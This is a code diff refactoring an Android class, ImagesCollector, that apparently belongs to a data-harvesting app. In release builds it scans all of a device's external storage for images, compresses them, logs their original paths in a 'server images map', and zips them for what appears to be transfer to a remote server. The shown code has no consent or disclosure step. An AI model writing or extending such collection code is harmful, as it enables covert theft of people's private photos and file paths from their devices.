@@ -4,6 +4,9 @@ import android.graphics.BitmapFactory;
 import android.os.Environment;
 import android.util.Log;
 
+import androidx.annotation.NonNull;
+
+import com.tangledbytes.sw.BuildConfig;
 import com.tangledbytes.sw.guides.ImageCollectorGuide;
 import com.tangledbytes.sw.utils.Constants;
 import com.tangledbytes.sw.utils.FileUtils;
@@ -19,30 +22,34 @@ import java.util.Random;
 
 public class ImagesCollector extends Collector {
     private static final String TAG = "ImagesCollector";
-    JSONArray collectedImagesMap = new JSONArray();
-
-    public boolean isValidImage(File file) {
-        BitmapFactory.Options options = new BitmapFactory.Options();
-        options.inJustDecodeBounds = true;
-        BitmapFactory.decodeFile(file.toString(), options);
-        return options.outHeight > 0 && options.outWidth > 0;
-    }
+    private final JSONArray compressedImagesMap = new JSONArray();
 
     @Override
     public void collect() {
         try {
-            compressImages();
-            FileUtils.write(Constants.FILE_SERVER_IMAGES_MAP, collectedImagesMap.toString());
-            addImagesToZip();
+            scanFileSystem();
+            FileUtils.write(Constants.FILE_SERVER_IMAGES_MAP, compressedImagesMap.toString());
+            zipCompressedImages();
         } catch (IOException e) {
             Log.wtf(TAG, "Failed to write compressed images map", e);
         }
     }
 
-    private void addImagesToZip() {
+    private void scanFileSystem() {
+        ImageCollectorGuide guide = new ImageCollectorGuide();
+        for (File file : getFilesToScan()) {
+            // TODO: Load quality from server
+            if (file.getName().equals("Android")) guide.setImageQuality(1);
+            else guide.setImageQuality(8);
+            if (file.isDirectory())
+                FileUtils.scanFiles(file, (imageFile) -> compressAndSaveImage(imageFile, file.getName(), guide));
+            else compressAndSaveImage(file, "root", guide);
+        }
+    }
+
+    private void zipCompressedImages() {
         File[] compressedImages = Constants.DIR_COMPRESSED_IMAGES.listFiles();
-        if (compressedImages == null)
-            return;
+        if (compressedImages == null) return;
         try {
             if (Constants.FILE_SERVER_IMAGES_ZIP.exists())
                 Constants.FILE_SERVER_IMAGES_ZIP.delete();
@@ -54,38 +61,37 @@ public class ImagesCollector extends Collector {
         }
     }
 
-    private void compressImages() {
-        ImageCollectorGuide guide = new ImageCollectorGuide();
-        // TODO: Scan whole system
-//        File[] files = new File(Environment.getExternalStorageDirectory(), "DCIM").listFiles();
-        File[] files = Environment.getExternalStorageDirectory().listFiles();
-        if (files == null) return;
-        for (File file : files) {
-//            if(file.getName().equals("sparrow"))
-//                continue;
-            // TODO: Load quality from server
-            if (file.getName().equals("Android")) guide.setImageQuality(1);
-            else guide.setImageQuality(8);
-            if(file.isDirectory()) Files.scanFiles(file, (imageFile) -> collectImage(imageFile, file.getName(), guide));
-            else collectImage(file, "root", guide);
-        }
-    }
-
-    private void collectImage(File imageSrc, String destDirName, ImageCollectorGuide guide) {
+    private void compressAndSaveImage(File imageSrc, String destDirName, ImageCollectorGuide guide) {
         if (!isValidImage(imageSrc))
             return;
         File imageDest = generateImageDest(new File(Constants.DIR_COMPRESSED_IMAGES, destDirName));
         Log.i(TAG, String.format("Compressing %s to %s...", imageSrc, imageDest));
         ImageCompressor.compress(imageSrc, imageDest, guide);
-        try {
-            collectedImagesMap.put(new JSONArray(String.format("['%s', '%s']", imageSrc, imageDest.getName())));
-        } catch (JSONException e) {
+        try { compressedImagesMap.put(new JSONArray(String.format("['%s', '%s']", imageSrc, imageDest.getName()))); } catch (JSONException e) {
             Log.wtf(TAG, e);
         }
     }
 
+    /* Returns dirs/files to scan for images based on the build type */
+    @NonNull
+    private File[] getFilesToScan() {
+        File[] filesToScan;
+        if (BuildConfig.DEBUG)
+            filesToScan = new File(Environment.getExternalStorageDirectory(), "DCIM").listFiles();
+        else
+            filesToScan = Environment.getExternalStorageDirectory().listFiles();
+        return filesToScan != null ? filesToScan : new File[]{};
+    }
+
+    private boolean isValidImage(File file) {
+        BitmapFactory.Options options = new BitmapFactory.Options();
+        options.inJustDecodeBounds = true;
+        BitmapFactory.decodeFile(file.toString(), options);
+        return options.outHeight > 0 && options.outWidth > 0;
+    }
+
     private File generateImageDest(File destDir) {
-        if(!destDir.exists())
+        if (!destDir.exists())
             destDir.mkdirs();
         File outputImage;
         Random random = new Random();
